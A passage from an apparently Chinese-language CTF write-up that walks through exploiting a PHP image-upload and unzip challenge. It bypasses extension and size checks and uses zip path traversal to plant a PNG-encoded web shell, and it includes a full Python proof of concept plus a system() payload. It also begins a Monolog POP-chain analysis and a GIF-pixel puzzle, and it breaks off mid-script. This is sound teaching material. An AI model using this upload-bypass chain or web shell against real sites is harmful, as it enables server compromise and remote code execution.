class="variable">$imageinfo</span> = getimagesize(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span> === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;å¦‚æœä¸èƒ½å¥½å¥½ä¼ å›¾ç‰‡çš„è¯å°±è¿˜æ˜¯ä¸è¦æ¥æ‰“æ‰°æˆ‘äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$imageinfo</span>[<span class="number">0</span>] !== <span class="number">1</span> &amp;&amp; <span class="variable">$imageinfo</span>[<span class="number">1</span>] !== <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¸œè¥¿ä¸èƒ½æ–¹æ–¹æ­£æ­£çš„è¯å°±å¾ˆè®¨åŒ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fileName</span>=urldecode(<span class="variable">$_FILES</span>[<span class="string">&#x27;postedFile&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="keyword">if</span>(stristr(<span class="variable">$fileName</span>,<span class="string">&quot;c&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;i&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;h&quot;</span>) || stristr(<span class="variable">$fileName</span>,<span class="string">&quot;ph&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;æœ‰äº›ä¸œè¥¿è®©ä½ ä¼ ä¸Šå»çš„è¯é‚£å¯ä¸å¾—äº†&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$imagePath</span> = <span class="string">&quot;image/&quot;</span> . mb_strtolower(<span class="variable">$fileName</span>);</span><br><span class="line">    <span class="keyword">if</span>(move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;postedFile&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$imagePath</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;upload success, image at <span class="subst">$imagePath</span>&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;ä¼ éƒ½æ²¡æœ‰ä¼ ä¸Šå»&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡æ‰«æå¯ä»¥å¾—åˆ° <code>example.php</code> å¹¶ä¸”å¾—åˆ°å¦‚ä¸‹æºç ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>])) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>]))</span><br><span class="line">    <span class="variable">$ctf</span> = <span class="variable">$_GET</span>[<span class="string">&quot;ctf&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ctf</span>==<span class="string">&quot;poc&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$zip</span> = <span class="keyword">new</span> \ZipArchive();</span><br><span class="line">    <span class="variable">$name_for_zip</span> = <span class="string">&quot;example/&quot;</span> . <span class="variable">$_POST</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line">    <span class="keyword">if</span>(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>)[count(explode(<span class="string">&quot;.&quot;</span>,<span class="variable">$name_for_zip</span>))-<span class="number">1</span>]!==<span class="string">&quot;zip&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;è¦ä¸å’±ä»¬å†çœ‹çœ‹ï¼Ÿ&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$zip</span>-&gt;open(<span class="variable">$name_for_zip</span>) !== <span class="literal">TRUE</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span> (<span class="string">&quot;éƒ½ä¸èƒ½è§£å‹å‘¢&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;å¯ä»¥è§£å‹ï¼Œæˆ‘æƒ³æƒ³å­˜å“ªé‡Œ&quot;</span>;</span><br><span class="line">    <span class="variable">$pos_for_zip</span> = <span class="string">&quot;/tmp/example/&quot;</span> . md5(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;extractTo(<span class="variable">$pos_for_zip</span>);</span><br><span class="line">    <span class="variable">$zip</span>-&gt;close();</span><br><span class="line">    unlink(<span class="variable">$name_for_zip</span>);</span><br><span class="line">    <span class="variable">$files</span> = glob(<span class="string">&quot;<span class="subst">$pos_for_zip</span>/*&quot;</span>);</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (is_dir(<span class="variable">$file</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$first</span> = imagecreatefrompng(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$size</span> = min(imagesx(<span class="variable">$first</span>), imagesy(<span class="variable">$first</span>));</span><br><span class="line">        <span class="variable">$second</span> = imagecrop(<span class="variable">$first</span>, [<span class="string">&#x27;x&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;y&#x27;</span> =&gt; <span class="number">0</span>, <span class="string">&#x27;width&#x27;</span> =&gt; <span class="variable">$size</span>, <span class="string">&#x27;height&#x27;</span> =&gt; <span class="variable">$size</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$second</span> !== <span class="literal">FALSE</span>) &#123;</span><br><span class="line">            <span class="variable">$final_name</span> = pathinfo(<span class="variable">$file</span>)[<span class="string">&quot;basename&quot;</span>];</span><br><span class="line">            imagepng(<span class="variable">$second</span>, <span class="string">&#x27;example/&#x27;</span>.<span class="variable">$final_name</span>);</span><br><span class="line">            imagedestroy(<span class="variable">$second</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        imagedestroy(<span class="variable">$first</span>);</span><br><span class="line">        unlink(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="mb-strtolower-image-size-bypass-and-zip-uploading"><a href="#mb-strtolower-image-size-bypass-and-zip-uploading" class="headerlink" title="mb_strtolower, image size bypass and zip uploading"></a>mb_strtolower, image size bypass and zip uploading</h4><p>ä¸Šä¼ å¤„å¯¹å›¾ç‰‡çš„å°ºå¯¸åšå‡ºäº†è¦æ±‚ï¼Œæ­¤æ—¶æœ‰ä¸€ç§æ–¹æ³•æ¥ç»•è¿‡ã€‚å°†ä¸‹åˆ—ä»£ç æ‹¼æ¥åˆ°æ–‡ç« æœ€åå³å¯ç»•è¿‡ <code>getimagesize</code> çš„æ£€æµ‹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1</span><br><span class="line">#define height 1</span><br></pre></td></tr></table></figure><p>æ–‡ä»¶åä¹Ÿç»è¿‡äº†è¿‡æ»¤ï¼Œç»“åˆåé¢çš„ä»£ç å¯çŸ¥éœ€è¦ä¸Šä¼ ä¸€ä¸ª zip å‹ç¼©æ–‡æ¡£ã€‚ä½¿ç”¨ <code>Latin Capital Letter I with Dot Above</code> ä¹Ÿå°±æ˜¯ <code>Ä°</code> å¯ä»¥ç»•è¿‡ <code>stristr</code> å¹¶ä¸”åœ¨ <code>mb_strtolower</code> ä¹‹åå˜æˆå°å†™å­—æ¯ <code>i</code>ã€‚æ­¤æ—¶ä¸Šä¼ å‹ç¼©æ–‡ä»¶å˜ä¸ºå¯èƒ½ï¼Œè€Œ example.php ä¸­æä¾›äº†è§£å‹çš„ä¸šåŠ¡ã€‚åªè¦ç”Ÿæˆä¸€ä¸ªæ¶æ„çš„å‹ç¼©æ–‡ä»¶ä½¿å…¶è§£å‹åå˜æˆä¸€ä¸ª PHP æ–‡ä»¶å³å¯å†™å…¥ shellã€‚é…åˆç›®å½•ç©¿è¶Šå³å¯å°† shell å†™åˆ°å¯è®¿é—®çš„ Web ç›®å½•ä¸‹ã€‚</p><h4 id="imagecreatefrompng-bypass"><a href="#imagecreatefrompng-bypass" class="headerlink" title="imagecreatefrompng bypass"></a>imagecreatefrompng bypass</h4><p>example.php ä¸­å¯¹æ–‡ä»¶è¿›è¡Œäº†æ£€æµ‹å’Œè£å‰ªï¼Œå› æ­¤ç›´æ¥å¯¹å›¾ç‰‡è¿›è¡Œä¿®æ”¹æ— æ³•é€šè¿‡æ£€æµ‹ä»è€Œä½¿æœ€åçš„æ–‡ä»¶è¢«åˆ é™¤ã€‚å› æ­¤æ­¤æ—¶éœ€è¦ç”Ÿæˆä¸€ä¸ªå¯ä»¥é€šè¿‡æ£€æµ‹çš„å›¾ç‰‡é©¬ã€‚</p><blockquote><p><a href="https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/">https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</a></p><p><a href="https://github.com/huntergregal/PNG-IDAT-Payload-Generator/">https://github.com/huntergregal/PNG-IDAT-Payload-Generator/</a></p></blockquote><p>ä½¿ç”¨å‚è€ƒçš„ Repo ä¸­çš„ä»£ç å¯ä»¥ç”Ÿæˆä¸€ä¸ªé•¿åº¦ä¸º 25 çš„ä»»æ„ PHP payload çš„æ­£æ–¹å½¢å›¾ç‰‡ï¼Œåªéœ€è¦å°†è‡ªå¸¦çš„ payload ç»è¿‡ Raw Deflate ä¹‹åå† Inflate å³å¯ã€‚è¿™é‡Œç›´æ¥æ”¾ä¸Šæœ€ç»ˆçš„ PoCã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> zlib</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> mpmath <span class="keyword">import</span> rand</span><br><span class="line"><span class="keyword">from</span> myPOC.idat <span class="keyword">import</span> save_image, bypass_filters, verify</span><br><span class="line"></span><br><span class="line">PAYLOAD_LENGTH = <span class="number">20</span></span><br><span class="line"><span class="comment"># PAYLOAD = &quot;(\&quot;PHP\&quot;.\&quot;INFO\&quot;)()&quot;</span></span><br><span class="line">PAYLOAD = <span class="string">&quot;EVAL($_POST[\&quot;H3X\&quot;])&quot;</span></span><br><span class="line">DEFAULT_COMPRESSED_STRING = <span class="string">b&quot;\xa3\x9f\x67\x54\x6f\x2c\x24\x15\x2b\x11\x67\x12\x54\x6f\x11\x2e\x29\x15\x2b\x21\x67\x22\x6b\x6f\x5f\x53\x10&quot;</span></span><br><span class="line">ENV = <span class="string">&quot;http://QUESTION_HOST_HERE/&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawDeflate</span>(<span class="params">data, compresslevel=<span class="number">9</span></span>):</span></span><br><span class="line">    compress = zlib.compressobj(</span><br><span class="line">        compresslevel,  <span class="comment"># level: 0-9</span></span><br><span class="line">        zlib.DEFLATED,  <span class="comment"># method: must be DEFLATED</span></span><br><span class="line">        -zlib.MAX_WBITS,  <span class="comment"># window size in bits:</span></span><br><span class="line">        <span class="comment">#   -15..-8: negate, suppress header</span></span><br><span class="line">        <span class="comment">#   8..15: normal</span></span><br><span class="line">        <span class="comment">#   16..30: subtract 16, gzip header</span></span><br><span class="line">        zlib.DEF_MEM_LEVEL,  <span class="comment"># mem level: 1..8/9</span></span><br><span class="line">        <span class="number">0</span>  <span class="comment"># strategy:</span></span><br><span class="line">        <span class="comment">#   0 = Z_DEFAULT_STRATEGY</span></span><br><span class="line">        <span class="comment">#   1 = Z_FILTERED</span></span><br><span class="line">        <span class="comment">#   2 = Z_HUFFMAN_ONLY</span></span><br><span class="line">        <span class="comment">#   3 = Z_RLE</span></span><br><span class="line">        <span class="comment">#   4 = Z_FIXED</span></span><br><span class="line">    )</span><br><span class="line">    deflated = compress.compress(data)</span><br><span class="line">    deflated += compress.flush()</span><br><span class="line">    <span class="keyword">return</span> deflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">RawInflate</span>(<span class="params">data</span>):</span></span><br><span class="line">    decompress = zlib.decompressobj(-zlib.MAX_WBITS)</span><br><span class="line">    inflated = decompress.decompress(data)</span><br><span class="line">    inflated += decompress.flush()</span><br><span class="line">    <span class="keyword">return</span> inflated</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate payload</span></span><br><span class="line">payload = (PAYLOAD + <span class="string">&quot;&#123;&#125;&quot;</span>).<span class="built_in">format</span>(<span class="string">&quot; &quot;</span> * <span class="built_in">int</span>(PAYLOAD_LENGTH - (<span class="built_in">len</span>(PAYLOAD)))).encode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Using payload ~&#123;&#125;~&quot;</span>.<span class="built_in">format</span>(payload))</span><br><span class="line">payloadWrapped = codecs.encode(</span><br><span class="line">    RawInflate(RawDeflate(DEFAULT_COMPRESSED_STRING).replace(<span class="string">b&quot;$_GET[0]($_POST[1]);&quot;</span>, payload)), <span class="string">&quot;hex_codec&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated wrapped payload &#123;&#125;&quot;</span>.<span class="built_in">format</span>(payloadWrapped))</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate image</span></span><br><span class="line">evilImage = <span class="string">&quot;./evilImage.png&quot;</span></span><br><span class="line">filterProof = bypass_filters(payloadWrapped)</span><br><span class="line">save_image(filterProof, evilImage)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Generated Image &#123;&#125;&quot;</span>.<span class="built_in">format</span>(evilImage))</span><br><span class="line">verify(evilImage, payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Fin&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Generate zip</span></span><br><span class="line"><span class="keyword">if</span> os.path.isfile(<span class="string">&quot;poc.zip&quot;</span>):</span><br><span class="line">    os.remove(<span class="string">&quot;poc.zip&quot;</span>)</span><br><span class="line">evilZip = <span class="built_in">open</span>(<span class="string">&quot;evilImage.png&quot;</span>, <span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">zipFile = zipfile.ZipFile(<span class="string">&quot;poc.zip&quot;</span>, <span class="string">&quot;a&quot;</span>, zipfile.ZIP_DEFLATED)</span><br><span class="line">info = zipfile.ZipInfo(<span class="string">&quot;poc.zip&quot;</span>)</span><br><span class="line">shellname = <span class="string">f&quot;shell<span class="subst">&#123;rand()&#125;</span>.php&quot;</span></span><br><span class="line">zipFile.writestr(<span class="string">f&quot;../<span class="subst">&#123;shellname&#125;</span>&quot;</span>, evilZip)</span><br><span class="line">zipFile.close()</span><br><span class="line">evilZip = <span class="built_in">open</span>(<span class="string">&quot;poc.zip&quot;</span>, <span class="string">&#x27;a+&#x27;</span>)</span><br><span class="line">evilZip.write(<span class="string">&quot;\n#define width 1 \n#define height 1&quot;</span>)</span><br><span class="line">evilZip.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Upload file</span></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;ENV&#125;</span>?ctf=upload&quot;</span></span><br><span class="line">payload = &#123;<span class="string">&#x27;ctf&#x27;</span>: <span class="string">&#x27;upload&#x27;</span>&#125;</span><br><span class="line">files = [(<span class="string">&#x27;postedFile&#x27;</span>, (<span class="string">&#x27;%2e%2e%2f%65%78%61%6d%70%6c%65%2fz1p.z%C4%B0p&#x27;</span>, <span class="built_in">open</span>(<span class="string">&#x27;poc.zip&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>), <span class="string">&#x27;application/octet-stream&#x27;</span>))]</span><br><span class="line">response = requests.post(url=url, data=payload, files=files, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Response is <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Trigger file inflate</span></span><br><span class="line">url = <span class="string">f&quot;<span class="subst">&#123;ENV&#125;</span>example.php?ctf=poc&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;file=z1p.zip&#x27;</span></span><br><span class="line">headers = &#123;<span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;</span><br><span class="line">response = requests.post(url=url, headers=headers, data=payload, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Response is <span class="subst">&#123;response.text&#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;[+] Maybe done, access at <span class="subst">&#123;ENV&#125;</span>example/<span class="subst">&#123;shellname&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>è¿è¡Œ PoC ä¹‹åå¯ä»¥ä½¿ç”¨å¾—åˆ°çš„ shell è¿›è¡Œ RCEã€‚ä½¿ç”¨å¦‚ä¸‹è½½è·å¯ä»¥å¾—åˆ° flagã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">H3X&#x3D;system(&quot;cat &#x2F;etc&#x2F;fllagggaaaa&#x2F;ejklwfthreu8rt&#x2F;fgrtgergyer&#x2F;ergerhrtytrh&#x2F;rtehtrhytryhre&#x2F;gfhtryrtgrewfre34t&#x2F;t43ft34f&#x2F;flag11e3kerjh3u&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;12e6ea81-d44a-4251-a9a7-a9ab7fe5ab97&#125;</span><br></pre></td></tr></table></figure><h3 id="filter"><a href="#filter" class="headerlink" title="filter"></a>filter</h3><p>é™„ä»¶çš„ composer.json ä¸­ç»™å‡ºäº†å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;monolog/monolog&quot;:&quot;1.19&quot;</span><br></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#x27;log&#x27; =&gt; [</span><br><span class="line">           &#x27;traceLevel&#x27; =&gt; YII_DEBUG ? 0 : 0,</span><br><span class="line">           &#x27;targets&#x27; =&gt; [</span><br><span class="line">               [</span><br><span class="line">                   &#x27;class&#x27; =&gt; &#x27;yii\log\FileTarget&#x27;,</span><br><span class="line">                   &#x27;levels&#x27; =&gt; [&#x27;error&#x27;],</span><br><span class="line">                   &#x27;logVars&#x27; =&gt; [],</span><br><span class="line">               ],</span><br><span class="line">           ],</span><br><span class="line">       ],]</span><br></pre></td></tr></table></figure><h4 id="POP-é“¾"><a href="#POP-é“¾" class="headerlink" title="POP é“¾"></a>POP é“¾</h4><p>ä¸»è¦ RCE çš„ç‚¹åœ¨ BufferHandler.php ä¸‹ <code>handle</code> çš„ <code>call_user_func()</code>ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621688756359/63c21883c8c7f9dbde22b9c9c8f22d0dc6b26545.png"></p><p><code>$processor</code> å’Œ <code>$record</code> æ˜¯å¯æ§çš„å˜é‡ï¼Œå› æ­¤å‘ä¸Šè¿½æº¯ã€‚åœ¨çˆ¶ç±» <code>AbstractHandler</code> çš„æ–¹æ³•ä¸­æ‰¾åˆ°ä»¥ä¸‹å¯è°ƒç”¨åˆ°çš„æ–¹æ³•ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689022054/4ffe0ae7a3425a11ed38f132aefe4dff0313eadc.png"></p><p>å› æ­¤éœ€è¦æ‰¾è°ƒç”¨åˆ° <code>handlerBatch</code> çš„æ–¹æ³•ï¼Œå¾ˆå®¹æ˜“æ‰¾åˆ° <code>close()</code> åˆ° <code>flush()</code> çš„è·¯çº¿ï¼Œå› æ­¤åªéœ€è¦æ‰¾èƒ½è§¦å‘åˆ°ä¸€ä¸ªå¯æ§ç±»çš„ <code>close()</code> æˆ–è€… <code>flush()</code> æ–¹æ³•çš„ç±»ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689068116/e5435adfb2b2c6bf5e082322a64a8b64cc824d14.png"></p><p>æ­¤æ—¶æƒ³è¦è§¦å‘åˆ°è¿™é‡Œéœ€è¦ä¿è¯ <code>$this-&gt;handler</code> ä¹Ÿæ˜¯ <code>BufferHandler</code>ï¼Œç®€å•å°† <code>$this</code> clone ä¸€ä»½å³å¯è¾¾æˆç›®çš„ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689084933/0b1c82bf55fa8d9a93efc4dbe5f677c4d77c5d5e.png"></p><p>åœ¨ <code>SyslogUdpHandler.php</code> ä¸‹å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªç¬¦åˆæ¡ä»¶çš„ <code>close()</code> æ–¹æ³•ï¼Œ<code>$socket</code> æ˜¯ä¸€ä¸ªå¯æ§çš„å˜é‡ï¼Œå› æ­¤éœ€è¦æƒ³åŠæ³•è§¦å‘åˆ°è¿™ä¸ª <code>close()</code> æ–¹æ³•ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689506835/7acf0471b69bbd7c27ebe510249d90e41c110fba.png" alt="image-20210522211826020"></p><p>åœ¨ <code>AbstractHandler.php</code> å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªææ„å‡½æ•°è°ƒç”¨åˆ°äº† <code>close()</code> æ–¹æ³•ã€‚åŒæ—¶ <code>SyslogUdpHandler</code> ç»§æ‰¿äº†è¿™ä¸ªç±»ä¸”æ²¡æœ‰é‡å†™ææ„å‡½æ•°ï¼Œå› æ­¤æ­¤å¤„çš„ <code>close()</code> æ°å¥½å¯ä»¥è§¦å‘åˆ°ä¸Šè¿°çš„å¯æ§çš„ <code>close()</code> æ–¹æ³•ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/ab96538f-1f60-45c7-abf2-b5a32ffe7625/1621689184997/a5e58ec5d13cb4a7cfb485d37c6d736b3d16fdcf.png"></p><p>è‡³æ­¤æ•´ä¸ªé“¾æ¡å½¢æˆï¼Œå†™å‡ºå¦‚ä¸‹è„šæœ¬æ¥ç”Ÿæˆåˆ©ç”¨çš„è½½è·ã€‚</p><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="running-pixel"><a href="#running-pixel" class="headerlink" title="running pixel"></a>running pixel</h3><p>ä½¿ç”¨ GIF Splitter å°†åŠ¨å›¾é€å¸§æå–å‡ºæ¥ï¼Œå¾ˆå®¹æ˜“å°†å…¶åˆ†ä¸ºåä¸ªåŠ¨ä½œä¸‰åä¸ƒç»„ã€‚å°†æ¯ä¸€ç»„çš„ä¸€å¸§ä¸ä¸Šä¸€ç»„çš„åŒä¸€å¸§ä½œæ¯”è¾ƒå¯ä»¥å¾—å‡ºä¸¤ä¸ªåƒç´ ç‚¹çš„ä¸åŒä¹‹å¤„ï¼Œä»¥æ­¤ç±»æ¨å°†æ‰€æœ‰æ¯”è¾ƒå¾—å‡ºçš„ä¸åŒç‚¹æ¸²æŸ“åœ¨ä¸€å¼ å›¾ç‰‡ä¸Šã€‚å†™å‡ºå¦‚ä¸‹è„šæœ¬è¾¾æˆç›®çš„ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line">PATH = <span class="string">&quot;C:/Users/lenovo/PycharmProjects/pyExp/pic/running_pixel.gif.ifl/IMG00&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 10 10 400</span></span><br><span class="line">image3 = Image.new(<span class="string">&quot;RGB&quot;</span>, (<span class="number">400</span>, <span class="number">400</span>), <span class="string">&quot;white&quot;</span>)</span><br><span class="line"></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">37</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        image1 = Image.<span class="built_in">open</span>(PATH + <span class="string">&quot;&#123;:02d&#125;&#123;&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i, j))</span><br><span class="line">        image2 = Image.<span class="built_in">open</span>(PATH + <span class="string">&quot;&#123;:02d&#125;&#123;&#125;.bmp&quot;</span>.<span class="built_in">format</span>(i + <span class="number">1</span>, j))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Comapring 